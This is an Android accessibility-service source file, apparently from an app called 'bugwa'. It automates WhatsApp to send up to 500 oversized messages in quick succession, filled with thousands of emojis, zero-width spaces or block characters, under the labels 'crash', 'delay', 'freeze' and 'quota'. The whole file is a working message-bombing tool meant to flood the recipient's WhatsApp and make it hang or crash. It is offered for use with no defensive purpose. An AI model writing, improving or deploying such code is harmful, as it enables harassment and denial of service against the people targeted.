package com.kaze.bugwa;

import android.accessibilityservice.AccessibilityService;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;

public class SpamService extends AccessibilityService {
    private int count = 0;
    private boolean isSending = false;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // Cek isRunning, kalau user pencet STOP, ini langsung berhenti
        if (!MainActivity.isRunning || count >= 500 || isSending) return;

        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;

        if (root.getPackageName() != null && root.getPackageName().toString().equals("com.whatsapp")) {
            AccessibilityNodeInfo sendBtn = findNodeById(root, "com.whatsapp:id/send");
            AccessibilityNodeInfo inputBox = findNodeById(root, "com.whatsapp:id/entry");

            if (sendBtn != null && inputBox != null) {
                isSending = true;
                StringBuilder sb = new StringBuilder();
                switch (MainActivity.bugType) {
                    case "crash": for (int i = 0; i < 3000; i++) sb.append("⚡"); break;
                    case "delay": for (int i = 0; i < 5000; i++) sb.append("\u200B"); break;
                    case "freeze": sb.append("FREEZE: "); for (int i = 0; i < 300; i++) sb.append("🔥"); break;
                    case "quota": sb.append("QUOTA: "); for (int i = 0; i < 1000; i++) sb.append("█"); break;
                }

                inputBox.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
                Bundle args = new Bundle();
                args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, sb.toString());
                inputBox.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);

                sendBtn.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                count++;
                new Handler(Looper.getMainLooper()).postDelayed(() -> isSending = false, 500);
            }
        }
    }

    private AccessibilityNodeInfo findNodeById(AccessibilityNodeInfo root, String id) {
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(id);
        return (nodes != null && !nodes.isEmpty()) ? nodes.get(0) : null;
    }

    @Override public void onInterrupt() {}
}
